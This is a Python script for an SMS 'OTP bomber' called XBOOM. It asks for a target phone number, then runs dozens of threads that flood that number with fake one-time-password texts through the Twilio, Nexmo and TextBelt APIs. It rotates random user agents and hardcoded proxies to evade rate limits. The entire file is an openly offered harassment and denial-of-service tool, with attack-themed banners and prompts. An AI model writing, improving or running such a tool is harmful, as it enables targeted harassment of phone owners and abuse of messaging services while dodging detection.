import requests
import threading
import time
import random
import os
from colorama import Fore, init
from fake_useragent import UserAgent

init(autoreset=True)

class XBOOM:
    def __init__(self):
        self.target = ""
        self.threads = 20
        self.total_attacks = 200
        self.sent_count = 0
        self.lock = threading.Lock()
        self.ua = UserAgent()
        self.proxies = self.load_proxies()

        self.apis = [
            {
                "name": "Twilio (Global)",
                "url": "https://api.twilio.com/2010-04-01/Accounts/{}/Messages.json",
                "data": {
                    "From": "+12055551234",
                    "Body": "Your OTP: {otp}"
                },
                "auth": ("ACCOUNT_SID", "AUTH_TOKEN"),
                "headers": {"Content-Type": "application/x-www-form-urlencoded"}
            },
            {
                "name": "Nexmo (Vonage)",
                "url": "https://rest.nexmo.com/sms/json",
                "data": {
                    "api_key": "YOUR_NEXMO_KEY",
                    "api_secret": "YOUR_NEXMO_SECRET",
                    "from": "NEXMO",
                    "text": "Your OTP: {otp}"
                },
                "headers": {}
            },
            {
                "name": "TextBelt (Free)",
                "url": "http://textbelt.com/text",
                "data": {
                    "phone": "{target}",
                    "message": "Your OTP: {otp}",
                    "key": "textbelt"
                },
                "headers": {}
            }
        ]

    def load_proxies(self):
        try:
            return [
                "http://103.149.162.195:80",
                "http://103.86.98.130:8080",
                "http://185.198.164.108:80"
            ]
        except:
            return []

    def get_proxy(self):
        return {"http": random.choice(self.proxies), "https": random.choice(self.proxies)} if self.proxies else None

    def banner(self):
        os.system("clear" if os.name == "posix" else "cls")
        print(Fore.RED + """
        ██╗  ██╗ ██████╗  ██████╗ ██████╗ ███╗   ███╗
        ╚██╗██╔╝██╔═══██╗██╔═══██╗██╔══██╗████╗ ████║
         ╚███╔╝ ██║   ██║██║   ██║██████╔╝██╔████╔██║
         ██╔██╗ ██║   ██║██║   ██║██╔══██╗██║╚██╔╝██║
        ██╔╝ ██╗╚██████╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║
        ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
        """)
        print(Fore.GREEN + "[+] Fully Automated OTP Bomber")
        print(Fore.YELLOW + "[+] Just enter target number - no other input needed")
        print(Fore.CYAN + "[+] GitHub: https://github.com/mmalekislam788-creator\n")

    def send_otp(self, api):
        while self.sent_count < self.total_attacks:
            try:
                otp = str(random.randint(1000, 9999))
                data = {k: v.format(otp=otp, target=self.target) for k, v in api["data"].items()}
                headers = {"User-Agent": self.ua.random}

                response = requests.post(
                    api["url"].format(**data) if "{}" in api["url"] else api["url"],
                    data=data,
                    auth=api.get("auth"),
                    headers=headers,
                    proxies=self.get_proxy(),
                    timeout=10
                )

                with self.lock:
                    self.sent_count += 1
                    if response.status_code in [200, 201]:
                        print(Fore.GREEN + f"[+] Sent via {api['name']} | OTP: {otp} | Total: {self.sent_count}/{self.total_attacks}")
                    else:
                        print(Fore.RED + f"[-] Failed via {api['name']} | Error: {response.text[:50]}...")

                time.sleep(random.uniform(1, 3))

            except Exception as e:
                print(Fore.RED + f"[-] Error in {api['name']}: {str(e)}")
                time.sleep(5)

    def attack(self):
        threads = []
        for api in self.apis:
            for _ in range(self.threads):
                t = threading.Thread(target=self.send_otp, args=(api,))
                threads.append(t)
                t.start()
                time.sleep(0.1)

        for t in threads:
            t.join()

    def main(self):
        self.banner()
        while True:
            self.target = input(Fore.CYAN + "[+] Enter Target Phone (e.g., +1234567890): ").strip()
            if self.target.startswith("+"):
                break
            print(Fore.RED + "[!] Error: Phone number must include country code (e.g., +1)")

        print(Fore.YELLOW + f"[+] Starting Attack on {self.target}...")
        self.attack()
        print(Fore.GREEN + "[+] Attack Completed!")

if __name__ == "__main__":
    bomber = XBOOM()
    bomber.main()
